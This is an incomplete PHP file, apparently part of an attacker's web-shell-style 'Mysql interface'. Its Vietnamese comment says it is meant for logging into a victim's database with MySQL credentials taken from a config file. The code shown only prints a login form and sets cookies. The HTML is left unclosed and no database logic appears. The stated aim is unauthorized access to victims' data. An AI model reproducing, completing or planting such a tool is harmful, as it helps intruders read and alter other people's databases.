<?php
/*
* Mysql interface v1.0
* -------------------------------
* Description :
* Dung` de login vao` CSDL cua victim khi da biet user va` pass cua mysql thong qua file config
*/

$HOSTNAME = "localhost";

function logon() {
	global $PHP_SELF;

	setcookie( "mysql_web_admin_username" );
	setcookie( "mysql_web_admin_password" );
	echo "<html>\n";
	echo "<head>\n";
	echo "<title>Mysql interface</title>\n";
	echo "</head>\n";
	echo "<body>\n";
	echo "<table width=100% height=100%><tr><td><center>\n";
	echo "<table cellpadding=2><tr><td bgcolor=#0090FF><center>\n";
	echo "<table cellpadding=20><tr><td bgcolor=#ffffff><center>\n";
	echo "<h1><b><font color=#FF0000>Mysql Interface v1.0</font></b></h1>\n";
	echo "<form action='$PHP_SELF'>\n";
	echo "<input type=hidden name=action value=logon_submit>\n";
	echo "<table cellpadding=5 cellspacing=1>\n";
	echo "<tr><td>Username </td><td> <input type=text name=username></td></tr>\n";
	echo "<tr><td>Password </td><td> <input type=password name=password></td></tr>\n";
	echo "</table><p>\n";
	echo "<input type=submit value='Enter'>\n";
	echo "<input type=reset value='Clear'><br>\n";
}

logon();

?>